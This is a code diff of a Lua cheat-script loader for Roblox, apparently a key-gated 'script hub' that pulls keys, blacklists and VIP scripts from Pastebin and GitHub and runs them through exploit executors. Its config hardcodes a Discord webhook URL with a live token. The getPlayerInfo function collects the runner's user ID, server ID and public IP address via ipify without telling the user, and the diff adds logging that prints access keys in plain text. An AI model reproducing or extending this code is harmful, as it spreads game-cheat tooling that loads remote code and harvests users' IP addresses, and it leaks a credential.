@@ -9,18 +9,21 @@ local DataStoreService = game:GetService("DataStoreService")
 
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1354219342840991964/kgyogYrGVoTXLoR472lDz7zM8KcKHK1EK46ss-Ppmg7tSOpUz0uYeujtrdGMD5Dfk1bw",
-    KEY_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Tune",
-    SUBSCRIPTION_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Subscription",
-    NEWS_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/News",
-    BLACKLIST_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Blacklist",
-    WHITELIST_URL = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Whitelist",
-    HTTP_TIMEOUT = 10,
+    KEY_URLS = {
+        PASTEBIN = "https://pastebin.com/raw/55RjjkTW",
+        GITHUB = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Tune"
+    },
+    SUBSCRIPTION_URL = "https://pastebin.com/raw/ThRPn5JG",
+    NEWS_URL = "https://pastebin.com/raw/vTKfsvCr",
+    BLACKLIST_URL = "https://pastebin.com/raw/3h23tX2Y",
+    WHITELIST_URL = "https://pastebin.com/raw/Qmp4r6es",
+    HTTP_TIMEOUT = 15, -- Increased timeout for reliability
     FEEDBACK_COOLDOWN = 4500,
     REFRESH_INTERVAL = 180,
     VERSION = "1.3.0",
     VIP_PERKS = {
         SCRIPT_BOOST = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/VIP_Boost",
-        EXCLUSIVE_UI = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/Exclusive_UI"
+        EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui"
     }
 }
 
@@ -67,7 +70,7 @@ end
 local HTTP_RATE_LIMIT = 0.5
 local lastHttpRequest = 0
 local function safeHttpGet(url, retries)
-    retries = retries or 2
+    retries = retries or 3 -- Increased retries
     local data, success, errorMsg
     
     for i = 1, retries do
@@ -94,20 +97,19 @@ local function safeHttpGet(url, retries)
         end
         
         if requestComplete and success then
-            local fakeUrl = "https://fakeurl.com/script" .. math.random(1000, 9999)
-            print("HTTP success for " .. fakeUrl .. ": " .. (data and "data_loaded" or "empty"))
+            print("HTTP success for " .. url .. ": " .. (data or "empty"))
             return true, data
         end
         
+        print("HTTP attempt " .. i .. " failed for " .. url .. ": " .. (errorMsg or "timeout"))
         if i < retries then wait(1) end
     end
     
-    return false, errorMsg or "Request timed out"
+    return false, errorMsg or "Request timed out after " .. retries .. " attempts"
 end
 
 local function getPlayerInfo()
     local info = {}
-    
     info.UserId = LocalPlayer.UserId
     info.Username = LocalPlayer.Name
     info.DisplayName = LocalPlayer.DisplayName
@@ -116,18 +118,15 @@ local function getPlayerInfo()
     info.JobId = game.JobId
     info.AccountAge = LocalPlayer.AccountAge
     info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
-    
     local success, ip = pcall(function()
         return game:HttpGet("https://api.ipify.org")
     end)
     info.IP = success and ip or "Hidden (Roblox Limitation)"
-    
     info.Executor = "Unknown"
     if syn then info.Executor = "Synapse X"
     elseif Krnl then info.Executor = "Krnl"
     elseif getgenv and getgenv().Drawing then info.Executor = "Generic (Drawing API Detected)"
     end
-    
     return info
 end
 
@@ -187,7 +186,7 @@ local keySystem = {
     isFetching = false,
     
     fetch = function(self)
-        if self.isFetching then return end
+        if self.isFetching then return self.key end
         self.isFetching = true
         
         if self.key and (tick() - self.lastFetch < 300) then
@@ -196,20 +195,40 @@ local keySystem = {
         end
         
         Rayfield:Notify({Title = "Loading", Content = "Fetching key...", Duration = 2})
-        local success, response = safeHttpGet(CONFIG.KEY_URL)
-        if success then
-            self.key = response
+        
+        -- Try Pastebin first
+        local success, response = safeHttpGet(CONFIG.KEY_URLS.PASTEBIN)
+        if success and response then
+            self.key = response:match("^%s*(.-)%s*$") -- Trim whitespace
+            print("Fetched key from Pastebin: '" .. self.key .. "'")
+            self.lastFetch = tick()
+            self.isFetching = false
+            return self.key
+        end
+        
+        -- Fallback to GitHub
+        Rayfield:Notify({Title = "Warning", Content = "Pastebin failed, trying GitHub...", Duration = 3})
+        success, response = safeHttpGet(CONFIG.KEY_URLS.GITHUB)
+        if success and response then
+            self.key = response:match("^%s*(.-)%s*$") -- Trim whitespace
+            print("Fetched key from GitHub: '" .. self.key .. "'")
             self.lastFetch = tick()
         else
-            self.key = "Key22Changed"
-            Rayfield:Notify({Title = "Warning", Content = "Using fallback key.", Duration = 3})
+            self.key = "Key22Changed" -- Fallback key
+            Rayfield:Notify({Title = "Error", Content = "Both sources failed. Using fallback key.", Duration = 5})
+            print("Key fetch failed. Error: " .. (response or "Unknown"))
         end
+        
         self.isFetching = false
         return self.key
     end,
     
     verify = function(self, input)
-        return input == self:fetch()
+        local fetchedKey = self:fetch()
+        local trimmedInput = input:match("^%s*(.-)%s*$") -- Trim input whitespace
+        local isMatch = trimmedInput == fetchedKey
+        print("Key verification - Input: '" .. trimmedInput .. "', Fetched: '" .. fetchedKey .. "', Match: " .. tostring(isMatch))
+        return isMatch
     end
 }
 
@@ -597,7 +616,7 @@ local keyInput = KeyTab:CreateInput({
             Rayfield:Destroy()
             scriptSystem:loadScriptSet(scriptToLoad, true)
         else
-            Rayfield:Notify({Title = "Invalid", Content = "Join Discord for key!", Duration = 5, Image = 4483362458})
+            Rayfield:Notify({Title = "Invalid", Content = "Key mismatch! Join Discord for the latest key!", Duration = 5, Image = 4483362458})
         end
     end
 })
